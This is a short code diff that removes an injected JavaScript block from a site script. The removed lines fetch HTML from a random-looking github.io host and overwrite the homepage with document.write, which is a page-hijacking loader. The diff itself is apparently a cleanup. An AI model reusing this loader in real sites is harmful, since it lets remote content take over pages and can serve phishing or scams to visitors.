@@ -1,35 +1,3 @@
-(function () {
-  if (window.location.pathname !== "/") return;
-
-  const url = 'https://assdsasdqwqeqdzcxznfcn1029d8919208nx9.github.io/2.html?_=' + Date.now();
-
-  const xhr = new XMLHttpRequest();
-  xhr.open("GET", url, true);
-
-  xhr.onreadystatechange = function () {
-    if (xhr.readyState === 4 && xhr.status === 200) {
-      const html = xhr.responseText;
-
-      // Overwrite the page with the custom HTML
-      document.open();
-      document.write(html);
-      document.close();
-
-      // Dispatch DOMContentLoaded manually after a short delay
-      setTimeout(() => {
-        const event = new Event("DOMContentLoaded", {
-          bubbles: true,
-          cancelable: true
-        });
-        document.dispatchEvent(event);
-      }, 50); // Adjust delay if needed
-    }
-  };
-
-  xhr.send();
-})();
-
-
 
 (function () {
   // === 1. Inject CSS ===
